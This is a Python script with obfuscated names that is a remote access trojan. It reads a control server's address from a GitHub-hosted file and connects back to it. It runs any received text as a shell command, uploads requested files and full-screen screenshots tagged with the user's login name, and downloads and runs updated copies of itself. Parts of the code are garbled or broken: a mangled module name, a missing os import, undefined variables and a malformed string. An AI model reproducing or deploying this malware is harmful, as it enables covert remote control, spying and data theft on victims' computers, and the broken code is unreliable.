import sys,subApBEoUFSnOGBmu,socket,time,requests
from PIL import ImageGrab
tTKQOvXsgTueEVMMykKI = "1.29.11.24"
bKCqRqsQHezrTaMhZcMqZG = ""
daioBnnSVAXQkhaPktlkg = ""
VByJttsbMZlfxSjmRWRUt = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
BGULfDVNWQsefPYszYcGWGs = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
NFHNKGbLpgNpTLkMw = "!"
def connect(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def ApBEoUFSnOGBmu(s):
	xHplMUnumK = s.recv(1024)
	if len(xHplMUnumK)==0:
		return True
	else:
		TVdxrivWcUUmpjpV(s, xHplMUnumK.decode("utf-8"))
def TVdxrivWcUUmpjpV(s, command):
	if not command.startswith(NFHNKGbLpgNpTLkMw):
		proc = subApBEoUFSnOGBmu.run(xHplMUnumK.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	cmd = command.split(" ")[0][1:]
	if cmd == "download":
		WLzVmZOzYWneLV(s, command)
	elif cmd == "screenshot":
		xUFnLVYlifcjwBvyRKFHZvL(s)
def WLzVmZOzYWneLV(s, command):
	paths = command.replace(NFHNKGbLpgNpTLkMw+"screenshot ", "").split(",")
	results = []
	for f in paths:
		results += mEZZdOOUgAwACt(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
def xUFnLVYlifcjwBvyRKFHZvL(command):
	image = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(fpath)
	image.close()
	r = mEZZdOOUgAwACt(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def mEZZdOOUgAwACt(filePath, uploadPath, addHeaders=None):
	if not os.path.exists(filePath):
		return "FILE NOT FOUND: "+filePath
	headers = {"user":os.getlogin()}
	if addHeaders is not None:
		headers = {**headers, **addHeaders}
	requests.post(bKCqRqsQHezrTaMhZcMqZG+":"+daioBnnSVAXQkhaPktlkg+"/"+uploadPath,
		files={open(filePath, "rb")},
		headers=headers)
	return "SUCCESS"
def fmKMJlXEjh():
	if bKCqRqsQHezrTaMhZcMqZG == "" or daioBnnSVAXQkhaPktlkg == "":
		xHplMUnumK = requests.get(VByJttsbMZlfxSjmRWRUt).text.replace("\n","").split(":")
		bKCqRqsQHezrTaMhZcMqZG = xHplMUnumK[0].strip()
		daioBnnSVAXQkhaPktlkg = xHplMUnumK[1].strip()
		eVuMtGYpGumDEIq = xHplMUnumK[2].strip()
	return bKCqRqsQHezrTaMhZcMqZG, daioBnnSVAXQkhaPktlkg, eVuMtGYpGumDEIq
def ZTYMmAjoElQsW():
	currentName = os.path.basename(__file__)
	fileType = currentName.split(".")[-1]
	updateFileName = currentName.replace(fileType,"") +"."+tTKQOvXsgTueEVMMykKI + fileType
	fullUpdateFilePath = os.path.join(os.path.getcwd(), updateFileName)
	with open(updateFileName, "wb+") as f:
		f.write(requests.get(BGULfDVNWQsefPYszYcGWGs+"/file"+fullUpdateFilePath.split(".")[-1]))
	if executable:
		os.system(".\"+fullUpdateFilePath)
	else:
		os.system("python "+fullUpdateFilePath")
def uVCOOoSGYiuSdOnpjwWwgPL():
	pass
def ZKSYOZG():
	h, p, v = fmKMJlXEjh()
	if tTKQOvXsgTueEVMMykKI != v:
		ZTYMmAjoElQsW()
	uVCOOoSGYiuSdOnpjwWwgPL()
	while True:
		try:
			while True:
				AkqkwxAAaeqRCsyzNoZWTWY=False
				try:
					s=connect(h, p)
					while not AkqkwxAAaeqRCsyzNoZWTWY:
						s.send(b"\n>> ")
						AkqkwxAAaeqRCsyzNoZWTWY=ApBEoUFSnOGBmu(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(ZKSYOZG())
